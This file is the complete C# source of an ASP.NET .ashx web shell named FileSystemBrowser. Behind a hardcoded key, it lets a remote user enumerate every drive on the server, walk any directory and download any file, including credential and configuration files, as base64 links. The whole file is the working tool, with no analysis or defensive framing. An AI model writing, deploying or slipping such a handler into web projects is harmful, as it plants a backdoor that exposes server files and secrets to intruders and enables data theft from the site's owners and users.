<%@ WebHandler Language="C#" Class="FileSystemBrowser" %>
using System;
using System.Web;
using System.IO;
using System.Text;

public class FileSystemBrowser : IHttpHandler
{
    private const string AUTHKEY = "woanware";
    private const string HEADER = "<html>\n<head>\n<title>filesystembrowser</title>\n<style type=\"text/css\"><!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n-->\n</style></head>\n<body>\n";
    private const string FOOTER = "</body>\n</html>\n";
    
    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/html";
        StringBuilder output = new StringBuilder();
        output.Append(HEADER);

        try
        {
            string authkey = context.Request["authkey"];
            string operation = context.Request["operation"];
            string file = context.Request["file"];
            string directory = context.Request["directory"];

            if (string.IsNullOrEmpty(authkey) || authkey != AUTHKEY)
            {
                output.Append("Invalid or missing authkey.");
            }
            else if (!string.IsNullOrEmpty(operation) && operation.Equals("download", StringComparison.OrdinalIgnoreCase))
            {
                output.Append(DownloadFile(context, file));
            }
            else // Default to directory listing
            {
                output.Append(OutputList(directory, authkey));
            }
        }
        catch (Exception ex)
        {
            output.Append("<pre>");
            output.Append(HttpUtility.HtmlEncode(ex.ToString()));
            output.Append("</pre>");
        }

        output.Append(FOOTER);
        context.Response.Write(output.ToString());
    }
    
    private string DownloadFile(HttpContext context, string file)
    {
        if (string.IsNullOrEmpty(file))
            return "No file supplied.";

        if (!File.Exists(file))
            return "File does not exist.";

        try
        {
            byte[] bytes = File.ReadAllBytes(file);
            string fileName = Path.GetFileName(file);
            string base64 = Convert.ToBase64String(bytes);

            return 
                $"<b>File: {fileName}</b><br/>" +
                $"<a download=\"{fileName}\" href=\"data:application/octet-stream;base64,{base64}\">Download</a><br/>" +
                $"<small>Size: {bytes.Length} bytes</small>";
        }
        catch (Exception ex)
        {
            return "<pre>" + HttpUtility.HtmlEncode(ex.ToString()) + "</pre>";
        }
    }

    private string OutputList(string dir, string authkey)
    {
        StringBuilder response = new StringBuilder();
        if (string.IsNullOrEmpty(dir))
        {
            string[] drives = Environment.GetLogicalDrives();
            foreach (string drive in drives)
            {
                response.Append($"<a href='?operation=list&directory={drive}&authkey={authkey}'>Drive: {drive}</a><br/>");
            }
            return response.ToString();
        }
        if (!Directory.Exists(dir))
            return "Directory does not exist.";

        DirectoryInfo di = new DirectoryInfo(dir);

        response.Append($"<b>Directory: {HttpUtility.HtmlEncode(dir)}</b><br/>");
        if (di.Parent != null)
            response.Append($"<a href='?operation=list&directory={HttpUtility.UrlEncode(di.Parent.FullName)}&authkey={authkey}'>.. (parent)</a><br/>");
        // Directories
        foreach (var d in di.GetDirectories())
        {
            response.Append($"<b>dir</b> <a href='?operation=list&directory={HttpUtility.UrlEncode(d.FullName)}&authkey={authkey}'>{HttpUtility.HtmlEncode(d.Name)}</a><br/>");
        }
        // Files
        foreach (var f in di.GetFiles())
        {
            response.Append($"file <a href='?operation=download&file={HttpUtility.UrlEncode(f.FullName)}&authkey={authkey}'>{HttpUtility.HtmlEncode(f.Name)}</a> ({f.Length} bytes)<br/>");
        }
        return response.ToString();
    }
    
    public bool IsReusable { get { return false; } }
}
